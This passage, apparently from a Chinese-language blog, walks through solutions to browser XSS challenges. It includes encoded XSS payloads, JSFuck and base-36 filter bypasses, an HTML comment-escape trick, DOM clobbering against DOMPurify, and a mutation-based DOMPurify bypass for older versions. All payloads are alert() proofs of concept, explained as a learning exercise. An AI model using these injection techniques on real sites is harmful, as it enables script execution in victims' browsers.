class=\"line\">markassbrownlee=&lt;img%20src=1%20onerror=alert%26%2340%3B1%26%2341%3B&gt;</span><br><span class=\"line\">markassbrownlee=&lt;a href=&quot;javascript:alert%25281%2529&quot;&gt;a </span><br><span class=\"line\">markassbrownlee=%3Csvg%20onload%3D%22%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x33%3B%26%23x33%3B%26%23x37%3B%26%23x29%3B%22%3E  //两次编码svg中的alert1</span><br><span class=\"line\">href中js可以解析url编码,%28 %29</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"ligma\"><a class=\"markdownIt-Anchor\" href=\"#ligma\">#</a> Ligma</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5qc2Z1Y2suY29tLw==\">http://www.jsfuck.com/</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">balls = (new URL(location).searchParams.get(&#x27;balls&#x27;) || &quot;Ninja has Ligma&quot;)</span><br><span class=\"line\">balls = balls.replace(/[A-Za-z0-9]/g, &#x27;&#x27;)</span><br><span class=\"line\">eval(balls)</span><br><span class=\"line\">jsfuck 注意编码，url中需要使用URL编码</span><br><span class=\"line\"></span><br><span class=\"line\">false       =&gt;  ![]</span><br><span class=\"line\">true        =&gt;  !![]</span><br><span class=\"line\">undefined   =&gt;  [][[]]</span><br><span class=\"line\">NaN         =&gt;  +[![]]</span><br><span class=\"line\">0           =&gt;  +[]</span><br><span class=\"line\">1           =&gt;  +!+[]</span><br><span class=\"line\">2           =&gt;  !+[]+!+[]</span><br><span class=\"line\">10          =&gt;  [+!+[]]+[+[]]</span><br><span class=\"line\">Array       =&gt;  []</span><br><span class=\"line\">Number      =&gt;  +[]</span><br><span class=\"line\">String      =&gt;  []+[]</span><br><span class=\"line\">Boolean     =&gt;  ![]</span><br><span class=\"line\">Function    =&gt;  [][&quot;filter&quot;]</span><br><span class=\"line\">eval        =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br><span class=\"line\">window      =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"mafia\"><a class=\"markdownIt-Anchor\" href=\"#mafia\">#</a> mafia</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mafia = (new URL(location).searchParams.get(&#x27;mafia&#x27;) || &#x27;1+1&#x27;)</span><br><span class=\"line\">mafia = mafia.slice(0, 50)</span><br><span class=\"line\">mafia = mafia.replace(/[\\`\\&#x27;\\&quot;\\+\\-\\!\\\\\\[\\]]/gi, &#x27;_&#x27;)</span><br><span class=\"line\">mafia = mafia.replace(/alert/g, &#x27;_&#x27;)</span><br><span class=\"line\">eval(mafia)</span><br><span class=\"line\"></span><br><span class=\"line\">payload1:</span><br><span class=\"line\">eval(17795081..toString(36))(1)</span><br><span class=\"line\">原理：</span><br><span class=\"line\">17795081是parseInt(&quot;alert&quot;, 36);的结果，即先把alert转为进制数，在使用..toString转回来</span><br><span class=\"line\">parseInt(&quot;&quot;, ); 解析一个字符串并返回指定基数的十进制整数， radix 是2-36之间的整数，表示被解析字符串的基数。</span><br><span class=\"line\">36 = 10 + 26    10个数字+26个字母</span><br><span class=\"line\">alert中最大的是t，进制数为30，因此必须使用&gt;=30的进制数才能表示t</span><br><span class=\"line\">转换时使用thatNumber.toString(radix)函数。</span><br><span class=\"line\">前一篇prompt(1)详细解释过了</span><br><span class=\"line\"></span><br><span class=\"line\">payload2:</span><br><span class=\"line\">eval(location.hash.slice(1))</span><br><span class=\"line\">eval(location.hash.slice(1))#alert(1)</span><br><span class=\"line\">但这种方式需要user interaction</span><br><span class=\"line\">原理：</span><br><span class=\"line\">url.href = &#x27;https://developer.mozilla.org/en-US/search?q=URL#search-results-close-container&#x27;;</span><br><span class=\"line\">console.log(url.hash);      // #search-results-close-container</span><br><span class=\"line\"></span><br><span class=\"line\">payload3：</span><br><span class=\"line\">Function(/ALERT(1337)/.source.toLowerCase())()</span><br><span class=\"line\">利用构造函数</span><br></pre></td></tr></table></figure>\n<h2 id=\"area-51\"><a class=\"markdownIt-Anchor\" href=\"#area-51\">#</a> Area 51</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;pwnme&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    var input = (new URL(location).searchParams.get(&#x27;debug&#x27;) || &#x27;&#x27;).replace(/[\\!\\-\\/\\#\\&amp;\\;\\%]/g, &#x27;_&#x27;);</span><br><span class=\"line\">    var template = document.createElement(&#x27;template&#x27;);</span><br><span class=\"line\">    template.innerHTML = input;</span><br><span class=\"line\">    pwnme.innerHTML = &quot;&lt;!-- &lt;p&gt; DEBUG: &quot; + template.outerHTML + &quot; &lt;/p&gt; --&gt;&quot;;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">分析：过滤 !-/#&amp;;% 全部被替换为_</span><br><span class=\"line\"></span><br><span class=\"line\">payload:</span><br><span class=\"line\">&lt;?&gt;&lt;svg onload=alert(1)&gt;</span><br><span class=\"line\">&lt;?&gt;&lt;img src=1 onerror=alert(1)&gt;</span><br><span class=\"line\">&lt;?&gt;&lt;a href=javascript:alert(1)&gt;aaa</span><br><span class=\"line\">只要能闭合注释，后面的基本除了script标签之外可以乱写</span><br><span class=\"line\">    </span><br><span class=\"line\">如果直接闭合，--会被替换，&gt;会被innerhtml转义</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;__&amp;gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">&lt;!-- --&gt;是多行注释，换行也不行，换行效果： ?debug=%0a&lt;svg/onload=alert(1)&gt;</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;</span><br><span class=\"line\">&lt;svg_onload=alert(1)&gt;&lt;/svg_onload=alert(1)&gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">但如果输入&lt;?&gt;  ?debug=&lt;?&gt;aaaaaaaaaaa</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;&lt;!--?--&gt;</span><br><span class=\"line\">aaaaaaaaaaa</span><br><span class=\"line\">&lt;p&gt;&lt;/p&gt; </span><br><span class=\"line\">--&amp;gt;</span><br><span class=\"line\">注释被闭合了，注释后面输入的内容可以逃逸出来</span><br><span class=\"line\">    </span><br><span class=\"line\">在template.innerHTML = input的时候，会解析input，然后使用 HTML parser 解析，根据 W3 文档</span><br><span class=\"line\">解析到&lt;的时候，HTML parser 正处于 [data state]</span><br><span class=\"line\">下一个字符是?，根据文档，HTML parser 会创建一个空的 comment token，进入 [bogus comment state]</span><br><span class=\"line\">下一个字符是 anything else，会将这个字符插入到刚刚的 comment 中，也就是我们上图看到的&lt;!--?--&gt; </span><br><span class=\"line\">例如输入是aaa&lt;?bbb&gt;ccc的时候，解析到第 i 个字符时，innerHTML 的结果是这样的</span><br><span class=\"line\">a</span><br><span class=\"line\">aa</span><br><span class=\"line\">aaa</span><br><span class=\"line\">aaa&lt;</span><br><span class=\"line\">aaa&lt;!--?--&gt;</span><br><span class=\"line\">aaa&lt;!--?b--&gt;</span><br><span class=\"line\">aaa&lt;!--?bb--&gt;</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;c</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;cc</span><br><span class=\"line\">aaa&lt;!--?bbb--&gt;ccc</span><br><span class=\"line\">直到该状态遇到了&gt;为止，回到 data state。注意这个 Bogus comment state 解析到&gt;的时候会直接回到 data state，也就是 HTML parser 最开始解析的状态，这个时候我们就可以插入 HTML 代码了。</span><br><span class=\"line\"></span><br><span class=\"line\">我们输入payload后：?debug=aaa&lt;?bbb&gt;ccc&lt;svg%20onload=alert(1)&gt;</span><br><span class=\"line\">首先aaa&lt;?bbb&gt;ccc 变为 aaa&lt;!--?bbb--&gt; ccc</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;aaa&lt;!--?bbb--&gt;</span><br><span class=\"line\">&quot;ccc&quot;</span><br><span class=\"line\">&lt;svg onload=&quot;alert(1)&quot;&gt;&lt;/svg&gt;</span><br><span class=\"line\">成功闭合注释</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如果题目没有过滤&amp;#时，存在unintended solution</span><br><span class=\"line\">payload:</span><br><span class=\"line\">&lt;img title=&quot;&amp;#x2D;&amp;#x2D;&amp;#x3E;&amp;#x3C;&amp;#x73;&amp;#x76;&amp;#x67;&amp;#x2F;&amp;#x6F;&amp;#x6E;&amp;#x6C;&amp;#x6F;&amp;#x61;&amp;#x64;&amp;#x3D;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;1&amp;#x29;&amp;#x3E;&quot;&gt;1</span><br><span class=\"line\"></span><br><span class=\"line\">我们可以用html实体编码闭合多行注释</span><br><span class=\"line\">但：简单的--&gt;; 并不能闭合,因为第一次的innerHTML会将&gt;进行编码为实体，第二次innerhtml时传入的是--&amp;gt;不能闭合</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;--&amp;gt;&amp;lt;svg/onload=alert()&amp;gt;&lt;/template&gt; &lt;/p&gt; --&gt;</span><br><span class=\"line\">但img标签中title可以绕过，因为第一次HTML parser不会将 title 属性内的字符串进行转义</span><br><span class=\"line\">&lt;svg&gt;&lt;b title=&quot;--&gt;&lt;svg/onload=alert()&gt;&quot;&gt;aaa</span><br><span class=\"line\">最终在html中渲染的是</span><br><span class=\"line\">&lt;!-- &lt;p&gt; DEBUG: &lt;template&gt;&lt;img title=&quot;--&gt;&lt;svg onload=&quot;alert()&quot;&gt;&quot;&amp;gt;1 &lt;/svg&gt;&lt;p&gt;&lt;/p&gt; --&amp;gt;</span><br><span class=\"line\">然后当 HTML parser 解析这段代码时，首先由&lt;!的存在，会进入[Markup declaration open state]，中间的代码&lt;p&gt; DEBUG: &lt;template&gt;&lt;img title=”会让 HTML parser 进入一些其他关于 comment 的状态，这些都无关紧要，最后的–&gt;让 HTML parser 进入到了[Comment End State]</span><br></pre></td></tr></table></figure>\n<h2 id=\"okboomer\"><a class=\"markdownIt-Anchor\" href=\"#okboomer\">#</a> OK，Boomer</h2>\n<p><strong>前置知识：</strong></p>\n<p>1.DOM 中内容会影响 Windows</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;btn&quot;</span>&gt;</span>click me<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"variable language_\">window</span>.<span class=\"property\">btn</span>)  <span class=\"comment\">//&lt;button id=&quot;btn&quot;&gt;click me&lt;/button&gt;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>只需要用 id 同名就可以拿到 html 元素</p>\n<p>也就是说除了  <code>id</code>  可以直接用  <code>window</code>  存取， <code>embed</code> ,  <code>form</code> ,  <code>img</code>  和  <code>object</code>  这四个标签用  <code>name</code>  也可以操作：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">embed</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;a&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">embed</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;b&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;c&quot;</span> /&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">object</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;d&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">object</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">info</span>(<span class=\"variable language_\">window</span>.<span class=\"property\">c</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>通过 html 影响 js</p>\n<p>1) 利用 html 标签的属性 id，很容易在 window 对象上创建任意的属性，但是我们能在新对象上创建新属性吗？</p>\n<p>2) 怎么控制 DOM elements 被强制转为 string 之后的值，大多数的 dom 节点被转为 string 后是 <code>[object HTMLInputElement]</code> 。</p>\n<p>关于问题 1)</p>\n<p>最常引用的解决方法是使用 <code>&lt;form&gt;</code>  标签。标记的每个 <code>&lt;input&gt;</code>  都属于 <code>&lt;form&gt;</code>  后代，该属性 <code>&lt;form&gt;</code>  引用 <code>name</code>  属性可以取到 <code>&lt;input&gt;</code> 。考虑以下示例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=test1&gt;</span><br><span class=\"line\">  &lt;input name=test2&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">  alert(test1.test2); // alerts &quot;[object HTMLInputElement]&quot;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>可以通过 name 取值，但取到的值是对象，即引出问题 2)</p>\n<p>js 内部会执行两个方法 tovalue,tostring，因为 js 的原型链</p>\n<p>一般来说，对象的 <code>valueof</code>  方法总是返回对象自身，这时再自动调用对象的 <code>tostring</code>  方法，将其转为字符串。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var obj = &#123; p: 1 &#125;;</span><br><span class=\"line\">obj.valueof().tostring() // &quot;[object object]&quot;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>对象的 <code>tostring</code>  方法默认返回 <code>[object object]</code> ，所以就得到了最前面那个例子的结果。</p>\n<p>通过遍历 HTML 中所有可能的元素并检查它们的 <code>toString</code>  方法是否继承自 <code>Object.prototype</code>  或以另一种方式定义</p>\n<p>一个简短的 JS 代码，它遍历 HTML 中所有可能的元素并检查它们的 <code>toString</code>  方法是否继承自 <code>Object.prototype</code>  或以另一种方式定义。如果它们不继承自 <code>Object.prototype</code> ，那么可能 <code>[object SomeElement]</code>  会返回其他东西。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object.getOwnPropertyNames(window)   //获取Window下object所有属性</span><br><span class=\"line\">.filter(p =&gt; p.match(/Element$/))   //匹配以element结尾的属性</span><br><span class=\"line\">.map(p =&gt; window[p])</span><br><span class=\"line\">.filter(p =&gt; p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== Object.prototype.toString)  //找到不继承object的tostring的元素</span><br></pre></td></tr></table></figure>\n<p>得到结果 <code>HTMLAreaElement</code> （ <code>&lt;area&gt;</code> ）和 <code>HTMLAnchorElement</code> （ <code>&lt;a&gt;</code> ）这两个元素不继承 tostring 方法</p>\n<p>在 <code>&lt;a&gt;</code>  元素的情况下， <code>toString</code>  只返回一个 <code>href</code>  属性值。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a id=test1 href=https://securitum.com&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">  alert(test1); // alerts &quot;https://securitum.com&quot;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>由于没有继承 tostring 导致弹出的不再是 object htmlinputelement，a 标签可以控制弹出的内容</p>\n<p>但是以下代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (window.test1.test2) &#123;</span><br><span class=\"line\">    eval(&#x27;&#x27;+window.test1.test2)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>执行结果为 undefined</p>\n<p>假设有两个 id 一样的元素</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a id=test1&gt;click!&lt;/a&gt;</span><br><span class=\"line\">&lt;a id=test1&gt;click2!&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n<p>通过 id 取值，得到 htmlcollection，htmlcollection 可以通过索引取值， <code>window.test1.test1</code>  实际上是指第一个元素，但无法取到第二个元素</p>\n<p>如果想取到第二个元素，需要给第二个元素加 name 值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a id=test1&gt;click!&lt;/a&gt;</span><br><span class=\"line\">&lt;a id=test1 name=test2&gt;click2!&lt;/a&gt;</span><br></pre></td></tr></table></figure>\n<p>我们可以通过 name 访问第二个 a <code>window.test1.test2</code></p>\n<p>通过给第二个 a 加 href 控制弹出内容</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;test1&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;test1&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;test2&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;x:alert(1)&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>但 x 不是标准协议，需要使用协议比如 <code>tel,mailto,cid,javascript</code>  等</p>\n<p>即：需要有两个 a 标签，且需要通过 name 去到第二个 a 标签</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDM3MTA2MTUwNzQtNzAwNGY1NGUtM2YyMy00NTc0LWJhYWYtMTk0MTI3MzEyZjIwLm1k\">📎Ok, Boomer.md</span></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h2</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;boomer&quot;</span>&gt;</span>Ok, Boomer.<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">    boomer.<span class=\"property\">innerHTML</span> = <span class=\"title class_\">DOMPurify</span>.<span class=\"title function_\">sanitize</span>(<span class=\"keyword\">new</span> <span class=\"title function_\">URL</span>(location).<span class=\"property\">searchParams</span>.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;boomer&#x27;</span>) || <span class=\"string\">&quot;Ok, Boomer&quot;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"built_in\">setTimeout</span>(ok, <span class=\"number\">2000</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>setTimeout (ok, 2000) 中的 ok 可以接收一个函数或者字符串，如果我们能够向 ok 这个变量注入可执行的 payload，那么也就能成功弹框</p>\n<p>可以使用 DOM Clobbering 的方式，通过向 HTML 注入 DOM 元素，来实现操作 JavaScript 变量</p>\n<p>首先，要构造一个变量 ok，我们可以通过创建一个 id=ok 的 DOM 元素来实现，比如 <code>&lt;div id=&quot;ok&quot;&gt;&lt;/div&gt;</code></p>\n<p>然后，ok 需要接受一个字符串作为值，而在对 <code>&lt;a&gt;</code>  标签调用 toString () 方法时，会返回属性 <code>href</code>  的值，所以，我们可以选择 <code>&lt;a&gt;</code>  标签作为构造对象</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?boomer=&lt;a id=ok href=cid:alert(1337)&gt;</span><br></pre></td></tr></table></figure>\n<p>href 的值要遵守 protocol:uri 的格式，然而，在 href 里直接使用 javascript: 协议是不行的</p>\n<p>通过查看 DOMPurify 的源码可以发现，它支持的合法的协议 有 mailto, tel, xmpp 等等，随便选择一个即可</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?boomer=&lt;a%20id=ok%20href=mailto:alert(1337)&gt;</span><br><span class=\"line\">?boomer=&lt;a%20id=ok%20href=tel:alert(1337)&gt;</span><br></pre></td></tr></table></figure>\n<p>由于劫持了 settimeout，因此会延迟两秒执行</p>\n<p>通过两个 id 可以取到的标签：</p>\n<p>form,button</p>\n<p>form,fieldset</p>\n<p>form,image</p>\n<p>form,img</p>\n<p>form,input</p>\n<p>form,object</p>\n<p>form,output</p>\n<p>form,select</p>\n<p>form,textarea</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=x&gt;</span><br><span class=\"line\">\t&lt;img id=y&gt;</span><br><span class=\"line\">console.log(x.y)  //&lt;img id=y&gt;</span><br></pre></td></tr></table></figure>\n<p>通过三层嵌套取到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=x&gt;</span><br><span class=\"line\">&lt;form id=x name=y&gt;</span><br><span class=\"line\">&lt;input id=z&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">window.x.y.z.value</span><br></pre></td></tr></table></figure>\n<p>unintended solution</p>\n<p>利用 html-svg-math 的命名空间混淆突变绕过 dompurify，要求 dompurify 版本 &lt; 2.0.7</p>\n<p>前置知识：</p>\n<p>1.DOMPurify 的典型用法使 HTML 标记被解析两次。</p>\n<p>dompurify 使用语句如下</p>\n<p><code>div.innerHTML = DOMPurify.sanitize(htmlMarkup)</code></p>\n<p>在解析和序列化 HTML 以及对 DOM 树的操作方面，在上面的简短片段中发生了以下操作：</p>\n<ol>\n<li><code>htmlMarkup</code>  <strong>被解析为 DOM 树</strong>。</li>\n<li>DOMPurify 清理 DOM 树（简而言之，该过程是遍历 DOM 树中的所有元素和属性，并删除所有不在允许列表中的节点）。</li>\n<li>DOM 树<strong>被序列化回 HTML 标记</strong>。</li>\n<li>分配给 后 <code>innerHTML</code> ，浏览器会<strong>再次解析 HTML 标记</strong>。</li>\n<li>解析后的 DOM 树被附加到文档的 DOM 树中。</li>\n</ol>\n<p>假设我们的初始 html 是 <code>A&lt;img src=1 onerror=alert(1)&gt;B</code> 。在第一步中，它被解析为以下树：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-1-1536x155.png\" alt=\"\"></p>\n<p>然后，DOMPurify 对其进行清理，留下以下 DOM 树：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-2-1536x161.png\" alt=\"\"></p>\n<p>然后它被序列化为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">A&lt;img src=&quot;1&quot;&gt;B</span><br></pre></td></tr></table></figure>\n<p>这就是 <code>DOMPurify.sanitize</code>  